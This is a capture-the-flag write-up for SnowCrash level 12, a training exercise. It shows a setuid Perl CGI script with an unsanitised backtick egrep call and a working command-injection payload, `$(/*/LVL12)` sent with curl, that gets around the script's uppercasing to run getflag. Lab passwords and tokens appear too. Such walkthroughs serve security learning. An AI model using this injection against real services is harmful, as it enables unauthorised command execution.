# Level 12

```bash
$ ssh level12@10.11.200.180 -p 4242
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          10.11.200.180
level12@10.11.200.180's password: fa6v5ateaw21peobuub8ipe6s
```

```bash
$ level12@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level12 level12  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level12 level12  220 Apr  3  2012 .bash_logout
-r-x------  1 level12 level12 3518 Aug 30  2015 .bashrc
-r-x------  1 level12 level12  675 Apr  3  2012 .profile
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
```

As we can see `level12.pl` is a perl

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1]; # y param
  $xx = $_[0]; # x param
  $xx =~ tr/a-z/A-Z/; # Capitalize the argument x
  $xx =~ s/\s.*//; # Keep only first word
  @output = `egrep "^$xx" /tmp/xd 2>&1`; # Here we can make our injection because $xx is not protected
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y"))); # take 2 params, x and y
```

So, we will call a script who call our `/tmp/LVL12` :
```bash
#!/bin/bash
whoami > /tmp/flag
getflag >> /tmp/flag
```

We put it execution rights

```bash
chmod +x /tmp/LVL12
```

And we call to the script with `$(/*/LVL12)`

```bash
level12@SnowCrash:~$ curl localhost:4646'?x=$(/*/LVL12)'
..
```

So, as we can see, the file `/tmp/flag` has been correctly created with the user, and the flag.

```bash
level12@SnowCrash:~cat /tmp/flag
flag12
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

----
Documentation:
* https://nets.ec/Command_Injection
